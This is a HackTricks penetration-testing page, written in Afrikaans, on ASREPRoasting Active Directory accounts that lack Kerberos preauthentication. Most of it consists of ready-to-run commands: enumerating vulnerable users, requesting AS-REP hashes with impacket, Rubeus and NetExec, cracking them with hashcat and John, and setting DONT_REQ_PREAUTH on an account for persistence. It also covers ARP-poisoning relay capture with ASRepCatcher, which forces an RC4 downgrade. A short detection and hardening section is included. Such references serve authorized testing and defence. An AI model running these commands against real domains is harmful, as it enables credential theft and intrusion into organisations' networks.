# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast is 'n security attack wat gebruikers uitbuit wat nie die **Kerberos pre-authentication required attribute** het nie. In wese laat hierdie kwesbaarheid aanvallers toe om authentication vir 'n gebruiker vanaf die Domain Controller (DC) aan te vra sonder dat die gebruiker se password nodig is. Die DC reageer dan met 'n boodskap wat met die gebruiker se password-derived key encrypted is, wat aanvallers kan probeer crack offline om die gebruiker se password te ontdek.

Die hoofvereistes vir hierdie attack is:

- **Lack of Kerberos pre-authentication**: Teikengebruikers moet nie hierdie security feature geaktiveer hê nie.
- **Connection to the Domain Controller (DC)**: Aanvallers benodig access tot die DC om requests te stuur en encrypted messages te ontvang.
- **Optional domain account**: 'n Domain account laat aanvallers toe om kwesbare gebruikers meer doeltreffend deur LDAP queries te identifiseer. Sonder so 'n account moet aanvallers usernames raai.

#### Enumerasie van kwesbare gebruikers (domain credentials benodig)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Versoek AS_REP-boodskap
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus versoek **RC4** by verstek, dus wys Event ID **4768** gewoonlik **preauth type 0** en **ticket encryption type 0x17**. As jy **`/aes`** byvoeg (of RC4 vir die teiken gedeaktiveer is), verwag eerder **AES etypes**.<sup>[[2]](#references)</sup>

#### Vinnige eenreëls (Linux)

- Enumereer eers potensiële teikens (bv. vanaf leaked build paths) met Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast 'n volledige gebruikersnaamlys sonder geldige creds met NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- As jy wel creds het, laat NetExec LDAP navraag doen en elke roastable account namens jou versoek: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- As die uitvoer met **`$krb5asrep$23$`** begin, crack dit met Hashcat **`-m 18200`**. As dit met **`$krb5asrep$17$`** of **`$krb5asrep$18$`** begin, verkies John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Moenie aanvaar elke AS-REP roast is RC4 nie. Moderne tooling kan **RC4** (`$krb5asrep$23$`) of **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) terugstuur, afhangend van die aangevraagde/onderhandelde enctype. **`hashcat -m 18200`** is vir **etype 23**, terwyl **John** `krb5asrep` direk vir **17/18/23** hanteer.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Dwing af dat **preauth** nie vir ’n gebruiker vereis word waar jy **GenericAll**-toestemmings (of toestemmings om eienskappe te skryf) het nie:
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### Opsporing en hardening

’n Suksesvolle roast lewer ’n **4768**-gebeurtenis op die DC met `Status=0x0` en `PreAuthType=0`. Moenie RC4 vir opsporing vereis nie: `TicketEncryptionType=0x17` is ’n nuttige sein vir swak enkripsie, maar ’n aanvaller kan AES versoek (event-log-waardes `0x11`/`0x12`). Op Windows Server 2016 en later met die kumulatiewe opdatering van 14 Januarie 2025 (of nuwer), stel weergawe 2 van gebeurtenis 4768 ook `ClientAdvertizedEncryptionTypes`, die rekening/DC se ondersteunde etypes en beskikbare sleutels bloot.<sup>[[5]](#references)</sup>

’n Praktiese hunt merk ’n kliënt wat slegs RC4 adverteer terwyl die rekening AES-sleutels het, en korreleer dan uitbarstings vanaf een bron-IP oor verskeie gebruikers sonder preauthentication. Stel wettige uitsonderings as basislyn eerder as om op elke `PreAuthType=0`-gebeurtenis te alert.

Die duursame oplossing is om **Do not require Kerberos preauthentication** uit te skakel vir elke gebruiker wat dit nie streng benodig nie, en om blootgestelde rekeningwagwoorde te roteer. Indien ’n uitsondering nie verwyder kan word nie, gebruik ’n lang, ewekansig gegenereerde wagwoord en minimale privileges. Die deaktivering van RC4 verhoog die cracking-koste, maar verwyder roastability nie omdat AES AS-REP-response steeds offline-crackable bly nie.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast sonder geloofsbriewe

’n Aanvaller op die netwerkpad kan die AS-REP wat tydens ’n normale, vooraf geverifieerde AS-uitruiling teruggestuur word, vaslê en die geënkripteerde deel daarvan vir offline cracking formateer. Anders as klassieke ASREPRoasting, vereis dit nie `DONT_REQ_PREAUTH` nie; dit lewer egter slegs rekeninge op waarvan die Kerberos-uitruiling werklik onderskep word. **ASRepCatcher** verkry die netwerkposisie by verstek met eenrigting-ARP-poisoning, of dit kan verkeer vanaf ’n ander MitM-tegniek verbruik met `--disable-spoofing`.<sup>[[6]](#references)</sup>\
As jy die verwante truuk sonder geloofsbriewe wil hê wat ’n **service ticket** in plaas van ’n **TGT** vanaf ’n principal sonder preauthentication terugstuur, sien [Kerberoast](kerberoast.md).

In `relay`-modus stuur [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) onderskepte AS-REQs aan en forseer **RC4** wanneer albei kante dit steeds toelaat. `listen` verander nie pakkette nie en vang dus die enctype vas waaroor die kliënt en DC onderhandel het. Beperk poisoning met `-t`/`-tf` eerder as om die hele subnet te raak waar moontlik.<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Gebeurtenis 4768: 'n Kerberos-verifikasiekaartjie is aangevra](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
